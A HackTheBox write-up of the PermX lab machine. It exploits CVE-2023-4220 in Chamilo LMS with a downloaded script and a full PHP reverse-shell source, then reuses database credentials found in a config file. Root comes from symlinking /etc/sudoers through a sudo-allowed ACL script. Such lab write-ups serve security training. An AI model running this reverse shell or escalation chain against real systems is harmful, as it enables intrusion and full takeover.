@@ -1,0 +1,441 @@
+---
+layout: writeup
+category: HackTheBox
+chall_description: https://app.hackthebox.com/machines/PermX
+points: 0
+solves: 13000
+tags: Linux CVE-2023-4220 ChamiloLMS
+date: 2024-10-20
+comments: true
+---
+
+<img src="/assets/images/htb/permx/icon.webp" alt="" width="40%">
+
+# Introduction
+PermX is an easy machine where we will exploit the [CVE-2023-4220](https://nvd.nist.gov/vuln/detail/CVE-2023-4220) that will allow us to upload a *.php* file where we will achieve a reverse shell accessing as the user `www-data` and looking for the configuration file of the database we will achieve the credentials where they are reused for the user `mtz`, the user `mtz` has sudo permissions in a script that grants permissions to any file located in the `/home/mtz` and making a symbolic link from sudoers to the home we can change the permissions and achieve root.
+
+# Enumeration
+
+We start with an nmap scan:
+```bash
+# Nmap 7.94SVN scan initiated Sun Oct 20 12:56:46 2024 as: nmap -p- --open -sSCV -n -Pn -vvv -oN target 10.10.11.23
+Nmap scan report for 10.10.11.23
+Host is up, received user-set (0.17s latency).
+Scanned at 2024-10-20 12:56:46 CEST for 129s
+Not shown: 64943 closed tcp ports (reset), 590 filtered tcp ports (no-response)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 e2:5c:5d:8c:47:3e:d8:72:f7:b4:80:03:49:86:6d:ef (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBAyYzjPGuVga97Y5vl5BajgMpjiGqUWp23U2DO9Kij5AhK3lyZFq/rroiDu7zYpMTCkFAk0fICBScfnuLHi6NOI=
+|   256 1f:41:02:8e:6b:17:18:9c:a0:ac:54:23:e9:71:30:17 (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIP8A41tX6hHpQeDLNhKf2QuBM7kqwhIBXGZ4jiOsbYCI
+80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.52
+| http-methods: 
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Did not follow redirect to http://permx.htb
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Read data files from: /usr/bin/../share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Oct 20 12:58:55 2024 -- 1 IP address (1 host up) scanned in 129.57 seconds
+```
+
+Let's add `permx.htb` to our `/etc/hosts` and let's access the web see what's there:
+
+| PORT | SERVICE             |
+|------|---------------------|
+| 22   | OpenSSH 8.9p1       |
+| 80   | Apache httpd 2.4.52 |
+
+![](/assets/images/htb/permx/1.png)
+
+If we do directory fuzzing we won't find much so we will search by subdomains:
+
+```bash
+❯ ffuf -u http://permx.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -fw 18 -t 100 -H 'HOST: FUZZ.permx.htb'
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://permx.htb/
+ :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+ :: Header           : Host: FUZZ.permx.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 100
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response words: 18
+________________________________________________
+
+www                     [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 119ms]
+lms                     [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 195ms]
+:: Progress: [4989/4989] :: Job [1/1] :: 150 req/sec :: Duration: [0:00:17] :: Errors: 0 ::
+```
+
+We are going to add this subdomain to our `/etc/hosts` and we are going to access it and see what it contains:
+
+![](/assets/images/htb/permx/2.png)
+
+Let's go fuzzing to see if we find anything interesting:
+
+```bash
+❯ gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u 'http://lms.permx.htb'
+===============================================================
+Gobuster v3.6
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://lms.permx.htb
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.6
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+/main                 (Status: 301) [Size: 313] [--> http://lms.permx.htb/main/]
+/web                  (Status: 301) [Size: 312] [--> http://lms.permx.htb/web/]
+/documentation        (Status: 301) [Size: 322] [--> http://lms.permx.htb/documentation/]
+/bin                  (Status: 301) [Size: 312] [--> http://lms.permx.htb/bin/]
+/src                  (Status: 301) [Size: 312] [--> http://lms.permx.htb/src/]
+/app                  (Status: 301) [Size: 312] [--> http://lms.permx.htb/app/]
+/vendor               (Status: 301) [Size: 315] [--> http://lms.permx.htb/vendor/]
+Progress: 2585 / 220547 (1.17%)^C
+[!] Keyboard interrupt detected, terminating.
+Progress: 2608 / 220547 (1.18%)
+===============================================================
+Finished
+===============================================================
+```
+
+We will be able to see that there is a directory called `documentation` if we enter to it we will be able to see the following:
+
+![](/assets/images/htb/permx/3.png)
+
+We found `version 1.11` of Chamilo, if we search we can find the following CVE:
+
+- [https://github.com/Ziad-Sakr/Chamilo-CVE-2023-4220-Exploit](https://github.com/Ziad-Sakr/Chamilo-CVE-2023-4220-Exploit)
+
+# Foothold
+
+Let's download the `CVE-2023-4220.sh` to our machine:
+
+```bash
+❯ wget https://raw.githubusercontent.com/Ziad-Sakr/Chamilo-CVE-2023-4220-Exploit/refs/heads/main/CVE-2023-4220.sh
+--2024-10-20 15:58:43--  https://raw.githubusercontent.com/Ziad-Sakr/Chamilo-CVE-2023-4220-Exploit/refs/heads/main/CVE-2023-4220.sh
+Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 185.199.109.133, 185.199.110.133, 185.199.108.133, ...
+Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|185.199.109.133|:443... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 2471 (2,4K) [text/plain]
+Saving to: ‘CVE-2023-4220.sh’
+
+CVE-2023-4220.sh                               100%[==================================================================================================>]   2,41K  --.-KB/s    in 0s      
+
+2024-10-20 15:58:43 (42,9 MB/s) - ‘CVE-2023-4220.sh’ saved [2471/2471]
+```
+
+We will see in the repository that we will need a `.php` file, I will use *phppentestmonkey*:
+
+```php
+<?php
+// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
+// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
+
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = 'YOURIP';
+$port = YOURPORT;
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; sh -i';
+$daemon = 0;
+$debug = 0;
+
+if (function_exists('pcntl_fork')) {
+	$pid = pcntl_fork();
+	
+	if ($pid == -1) {
+		printit("ERROR: Can't fork");
+		exit(1);
+	}
+	
+	if ($pid) {
+		exit(0);  // Parent exits
+	}
+	if (posix_setsid() == -1) {
+		printit("Error: Can't setsid()");
+		exit(1);
+	}
+
+	$daemon = 1;
+} else {
+	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
+}
+
+chdir("/");
+
+umask(0);
+
+// Open reverse connection
+$sock = fsockopen($ip, $port, $errno, $errstr, 30);
+if (!$sock) {
+	printit("$errstr ($errno)");
+	exit(1);
+}
+
+$descriptorspec = array(
+   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
+   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
+   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
+);
+
+$process = proc_open($shell, $descriptorspec, $pipes);
+
+if (!is_resource($process)) {
+	printit("ERROR: Can't spawn shell");
+	exit(1);
+}
+
+stream_set_blocking($pipes[0], 0);
+stream_set_blocking($pipes[1], 0);
+stream_set_blocking($pipes[2], 0);
+stream_set_blocking($sock, 0);
+
+printit("Successfully opened reverse shell to $ip:$port");
+
+while (1) {
+	if (feof($sock)) {
+		printit("ERROR: Shell connection terminated");
+		break;
+	}
+
+	if (feof($pipes[1])) {
+		printit("ERROR: Shell process terminated");
+		break;
+	}
+
+	$read_a = array($sock, $pipes[1], $pipes[2]);
+	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);
+
+	if (in_array($sock, $read_a)) {
+		if ($debug) printit("SOCK READ");
+		$input = fread($sock, $chunk_size);
+		if ($debug) printit("SOCK: $input");
+		fwrite($pipes[0], $input);
+	}
+
+	if (in_array($pipes[1], $read_a)) {
+		if ($debug) printit("STDOUT READ");
+		$input = fread($pipes[1], $chunk_size);
+		if ($debug) printit("STDOUT: $input");
+		fwrite($sock, $input);
+	}
+
+	if (in_array($pipes[2], $read_a)) {
+		if ($debug) printit("STDERR READ");
+		$input = fread($pipes[2], $chunk_size);
+		if ($debug) printit("STDERR: $input");
+		fwrite($sock, $input);
+	}
+}
+
+fclose($sock);
+fclose($pipes[0]);
+fclose($pipes[1]);
+fclose($pipes[2]);
+proc_close($process);
+
+function printit ($string) {
+	if (!$daemon) {
+		print "$string\n";
+	}
+}
+
+?>
+```
+
+Now let's run the exploit:
+
+```bash
+❯ ./CVE-2023-4220.sh -f rev.php -h http://lms.permx.htb -p 9999
+-e 
+The file has successfully been uploaded.
+
+-e #    Use This leter For Interactive TTY ;)  
+#    python3 -c 'import pty;pty.spawn("/bin/bash")'
+#    export TERM=xterm
+#    CTRL + Z
+#    stty raw -echo; fg
+-e 
+# Starting Reverse Shell On Port 9999 . . . . . . .
+-e 
+listening on [any] 9999 ...
+connect to [10.10.16.23] from (UNKNOWN) [10.10.11.23] 34490
+Linux permx 5.15.0-113-generic #123-Ubuntu SMP Mon Jun 10 08:16:17 UTC 2024 x86_64 x86_64 x86_64 GNU/Linux
+ 14:03:57 up 1 day, 21:00,  1 user,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+sh: 0: can't access tty; job control turned off
+$ whoami
+www-data
+```
+
+We will be able to see that there is a user named `mtz`:
+```bash
+www-data@permx:/$ cat /etc/passwd | grep /bin/bash
+root:x:0:0:root:/root:/bin/bash
+mtz:x:1000:1000:mtz:/home/mtz:/bin/bash
+
+We will look for the chamilo lms database configuration file:
+
+```bash
+www-data@permx:/var/www/chamilo/app/config$ cat configuration.php 
+<?php
+// Chamilo version 1.11.24
+// File generated by /install/index.php script - Sat, 20 Jan 2024 18:20:32 +0000
+/* For licensing terms, see /license.txt */
+/**
+ * This file contains a list of variables that can be modified by the campus site's server administrator.
+ * Pay attention when changing these variables, some changes may cause Chamilo to stop working.
+ * If you changed some settings and want to restore them, please have a look at
+ * configuration.dist.php. That file is an exact copy of the config file at install time.
+ * Besides the $_configuration, a $_settings array also exists, that
+ * contains variables that can be changed and will not break the platform.
+ * These optional settings are defined in the database, now
+ * (table settings_current).
+ */
+
+// Database connection settings.
+$_configuration['db_host'] = 'localhost';
+$_configuration['db_port'] = '3306';
+$_configuration['main_database'] = 'chamilo';
+$_configuration['db_user'] = 'chamilo';
+$_configuration['db_password'] = '03F6lY3u*******';
+// Enable access to database management for platform admins.
+$_configuration['db_manager_enabled'] = false;
+
+******
+```
+
+With these credentials we can enter the database but we will not find much that is useful to us, but if we try these credentials as the user `mtz` we will see that they are correct:
+
+```bash
+www-data@permx:/var/www/chamilo/app/config$ su mtz
+Password: 
+mtz@permx:/var/www/chamilo/app/config$ whoami
+mtz
+```
+
+We can now read the `user.txt`
+```bash
+mtz@permx:~$ cat user.txt 
+75956a673e026c8**************
+mtz@permx:~$ 
+```
+
+# Privilege Escalation
+
+If we do a `sudo -l` we can see that we have permissions to execute as root the `acl.sh` file:
+```bash
+mtz@permx:~$ sudo -l
+Matching Defaults entries for mtz on permx:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
+    use_pty
+
+User mtz may run the following commands on permx:
+    (ALL : ALL) NOPASSWD: /opt/acl.sh
+```
+
+If we execute it we will see that it asks us to indicate a `user` `permission` `file`, what we will try to do is to make a symbolic link from sudoers to our home:
+```bash
+mtz@permx:~$ sudo /opt/acl.sh 
+Usage: /opt/acl.sh user perm file
+```
+
+```bash
+mtz@permx:~$ ln -s /etc/sudoers /home/mtz/fakesudoers
+mtz@permx:~$ ls
+acl.sh  bash  fakesudoers  passwd  script.sh  user.txt
+```
+
+Now we will use the script and give `rwx` permissions to the user `mtz`:
+
+```bash
+mtz@permx:~$ sudo /opt/acl.sh mtz rwx /home/mtz/fakesudoers
+mtz@permx:~$ ls -la fakesudoers 
+lrwxrwxrwx 1 mtz mtz 12 Oct 20 14:25 fakesudoers -> /etc/sudoers
+```
+
+Now we will give us all the permissions in the sudoers:
+
+```bash
+mtz@permx:~$ cat fakesudoers 
+#
+# This file MUST be edited with the 'visudo' command as root.
+#
+# Please consider adding local content in /etc/sudoers.d/ instead of
+# directly modifying this file.
+#
+# See the man page for details on how to write a sudoers file.
+#
+Defaults	env_reset
+Defaults	mail_badpass
+Defaults	secure_path="/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin"
+Defaults	use_pty
+
+# This preserves proxy settings from user environments of root
+# equivalent users (group sudo)
+#Defaults:%sudo env_keep += "http_proxy https_proxy ftp_proxy all_proxy no_proxy"
+
+# This allows running arbitrary commands, but so does ALL, and it means
+# different sudoers have their choice of editor respected.
+#Defaults:%sudo env_keep += "EDITOR"
+
+# Completely harmless preservation of a user preference.
+#Defaults:%sudo env_keep += "GREP_COLOR"
+
+# While you shouldn't normally run git as root, you need to with etckeeper
+#Defaults:%sudo env_keep += "GIT_AUTHOR_* GIT_COMMITTER_*"
+
+# Per-user preferences; root won't have sensible values for them.
+#Defaults:%sudo env_keep += "EMAIL DEBEMAIL DEBFULLNAME"
+
+# "sudo scp" or "sudo rsync" should be able to use your SSH agent.
+#Defaults:%sudo env_keep += "SSH_AGENT_PID SSH_AUTH_SOCK"
+
+# Ditto for GPG agent
+#Defaults:%sudo env_keep += "GPG_AGENT_INFO"
+
+# Host alias specification
+
+# User alias specification
+
+# Cmnd alias specification
+
+# User privilege specification
+root	ALL=(ALL:ALL) ALL
+mtz     ALL=(ALL:ALL) ALL
+```
+
+Now we will try to do a `sudo su` and enter the password obtained from the user `mtz`:
+```bash
+mtz@permx:~$ sudo su
+[sudo] password for mtz: 
+root@permx:/home/mtz# whoami
+root
+```
